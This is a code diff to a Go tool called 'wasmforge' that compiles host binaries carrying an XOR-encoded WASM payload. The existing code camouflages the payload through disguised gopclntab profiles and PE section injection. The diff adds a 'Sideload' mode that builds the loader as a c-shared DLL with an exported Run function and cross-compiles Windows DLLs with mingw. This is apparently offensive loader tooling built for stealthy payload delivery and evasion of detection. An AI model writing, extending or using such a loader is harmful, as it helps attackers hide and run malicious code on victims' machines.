@@ -26,6 +26,9 @@ type HostConfig struct {
 	// Ghost is the name of the ghost profile to use for gopclntab camouflage.
 	// Empty string means "auto" (random embedded profile if available).
 	Ghost string
+	// Sideload emits a c-shared library with //export Run instead of a
+	// standalone main binary. Forces //go:embed payload (no PE section inject).
+	Sideload bool
 }
 
 // GenerateHost generates and compiles the host binary that embeds the WASM module.
@@ -388,7 +391,15 @@ func GenerateHost(wasmPath, outputPath, tmpDir string, cfg HostConfig, verbose b
 	//
 	// Embed path: XOR the raw remapped WASM (no compression).
 	// At runtime: XOR decode → WASM.
-	if isTargetingWindows() && os.Getenv("WASMFORGE_EMBED_PAYLOAD") != "1" {
+	//
+	// Sideload (c-shared) always uses embed — PE section injection targets
+	// standalone EXE layouts and is not applied to DLL/.so artifacts.
+	if cfg.Sideload {
+		if verbose {
+			fmt.Fprintf(os.Stderr, "wasmforge: sideload mode — embedding payload (%d bytes) via //go:embed\n", len(wasmData))
+		}
+	}
+	if !cfg.Sideload && isTargetingWindows() && os.Getenv("WASMFORGE_EMBED_PAYLOAD") != "1" {
 		pc.PEPayload = true
 		if os.Getenv("WASMFORGE_CHUNK_PAYLOAD") == "1" {
 			pc.ChunkPayload = true
@@ -403,6 +414,7 @@ func GenerateHost(wasmPath, outputPath, tmpDir string, cfg HostConfig, verbose b
 			}
 		}
 	} else {
+		// Embed path (Linux/macOS hosts, WASMFORGE_EMBED_PAYLOAD=1, or sideload).
 		// Optionally zlib-compress before XOR to shrink .rdata footprint.
 		origLen := len(wasmData)
 		compressed := false
@@ -501,10 +513,22 @@ func GenerateHost(wasmPath, outputPath, tmpDir string, cfg HostConfig, verbose b
 	if cfg.NativeAOT {
 		buildArgs = append(buildArgs, "-tags", "nativeaot")
 	}
+	if cfg.Sideload {
+		buildArgs = append(buildArgs, "-buildmode=c-shared")
+	}
 	buildArgs = append(buildArgs, "-o", absOutput, ".")
 	buildCmd := exec.Command("go", buildArgs...)
 	buildCmd.Dir = hostDir
 	buildCmd.Env = append(os.Environ(), "GOWORK=off", "GOTOOLCHAIN=local")
+	if cfg.Sideload {
+		// c-shared requires CGO. Cross-compiling Windows DLLs needs a mingw CC.
+		buildCmd.Env = append(buildCmd.Env, "CGO_ENABLED=1")
+		if isTargetingWindows() && runtime.GOOS != "windows" {
+			if os.Getenv("CC") == "" {
+				buildCmd.Env = append(buildCmd.Env, "CC=x86_64-w64-mingw32-gcc")
+			}
+		}
+	}
 
 	// DEBUG: print host go.mod when verbose.
 	if verbose {
